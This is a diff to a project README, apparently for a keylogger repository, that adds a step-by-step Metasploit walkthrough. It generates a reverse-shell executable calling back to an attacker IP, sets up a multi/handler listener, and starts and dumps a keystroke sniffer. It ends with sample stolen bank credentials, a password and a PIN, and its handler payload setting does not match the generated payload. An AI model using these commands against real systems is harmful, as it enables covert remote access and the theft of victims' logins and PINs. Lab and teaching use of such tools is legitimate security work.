@@ -33,5 +33,78 @@ Finally, the threat actor will be able to use payloads installed on the targeted
 # **Content**
 * [Building the keylogger using Metasploit-framework](https://github.com/Seyigate/gate_Keylogger/blob/main/Building%20the%20keylogger%20using%20Metasploit-framework)
 
+* ## gate_keylogger
+The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework see- [metasploit-unleashed](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+
+Metasploit is handy for generating a reverse shell. The following command generates a reverse TCP shell with the Metasploit framework:
+It generate a Windows reverse shell executable that will connect back to us on port 4444.
+```
+ ┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f exe -o keyshell.exe
+```
+
+For the purpose of this project, A listener interactive shell will be initiated, this will allows for serving a shell to access
+the targeted machine when the victim sends a TCP connection to record and steal consecutive keystrokes that the user enters on a device.
+
+```
+  ┌──(kali㉿kali)-[~]
+    └─$ msfconsole
+```
+
+In msfconsole, select an exploit module, which is exploit/multi/handler
+multi/handler exploit is a stub that handles exploits launched outside of the framework.
+it is also a remote exploit module, which can also engage multiple hosts.
+
+```
+  msf6 > use exploit/multi/handler
+  msf6 exploit(multi/handler) >show info
+```
+ When using the exploit/multi/handler module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
+ 
+```
+  msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+  msf6 exploit(multi/handler) > show options
+```
+
+ Then configure the parameter appropriately
+ 
+```
+ msf6 exploit(multi/handler) > set LHOST 192.168.50.2
+ msf6 exploit(multi/handler) > set LPORT 4444
+```
+Now that we have everything set up and ready to go, 
+We run exploit for the multi/handler and execute our generated executable on the victim. 
+The multi/handler handles the exploit for us and presents us our shell.
+
+```
+    msf6 exploit(handler) > exploit
+```
+The keyscan_start command starts the keylogging feature on the remote machine.
+    Starting the keystroke sniffer ...
+```
+ meterpreter> keyscan_start    
+```
+ Starting the keystroke sniffer ...
+ The keyscan_dump command is a keylogger feature. You must use the keyscan_start command before using keyscan_dump
+   
+```
+  meterpreter> keyscan_dump
+```
+ Dumping capture keystrokes ...
+
+    <SHIFT> www.baclaysbank.co.uk
+    <SHIFT>yinkajah@gmail.com
+    <CR> R2jshb!@(*&^HB
+      <CR>pin: 126782
+     snip....
+
+
+   
+
+
+
+
+  
+
 
 
